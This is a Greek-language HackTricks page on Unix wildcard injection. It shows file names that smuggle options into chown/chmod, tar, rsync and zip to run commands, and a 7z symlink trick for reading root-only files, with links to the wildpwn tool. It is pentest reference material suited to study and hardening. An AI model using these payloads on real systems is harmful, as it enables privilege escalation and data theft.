{{#include ../../banners/hacktricks-training.md}}

## chown, chmod

Μπορείτε να **υποδείξετε ποιος είναι ο ιδιοκτήτης του αρχείου και ποιες άδειες θέλετε να αντιγράψετε για τα υπόλοιπα αρχεία**
```bash
touch "--reference=/my/own/path/filename"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(συνδυασμένη επίθεση)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Εκτέλεση αυθαίρετων εντολών:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(επίθεση tar)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Εκτέλεση αυθαίρετων εντολών:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_attack)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

Στο **7z** ακόμη και χρησιμοποιώντας `--` πριν από `*` (σημειώστε ότι το `--` σημαίνει ότι η επόμενη είσοδος δεν μπορεί να θεωρηθεί ως παράμετροι, οπότε μόνο διαδρομές αρχείων σε αυτή την περίπτωση) μπορείτε να προκαλέσετε ένα τυχαίο σφάλμα για να διαβάσετε ένα αρχείο, οπότε αν μια εντολή όπως η παρακάτω εκτελείται από τον root:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Και μπορείτε να δημιουργήσετε αρχεία στον φάκελο όπου εκτελείται αυτό, μπορείτε να δημιουργήσετε το αρχείο `@root.txt` και το αρχείο `root.txt` που είναι ένα **symlink** στο αρχείο που θέλετε να διαβάσετε:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Τότε, όταν εκτελείται το **7z**, θα θεωρήσει το `root.txt` ως ένα αρχείο που περιέχει τη λίστα των αρχείων που πρέπει να συμπιέσει (αυτό υποδηλώνει η ύπαρξη του `@root.txt`) και όταν το 7z διαβάσει το `root.txt`, θα διαβάσει το `/file/you/want/to/read` και **καθώς το περιεχόμενο αυτού του αρχείου δεν είναι μια λίστα αρχείων, θα εμφανίσει ένα σφάλμα** δείχνοντας το περιεχόμενο.

_Περισσότερες πληροφορίες στα Write-ups του box CTF από το HackTheBox._

## Zip

**Εκτέλεση αυθαίρετων εντολών:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{{#include ../../banners/hacktricks-training.md}}
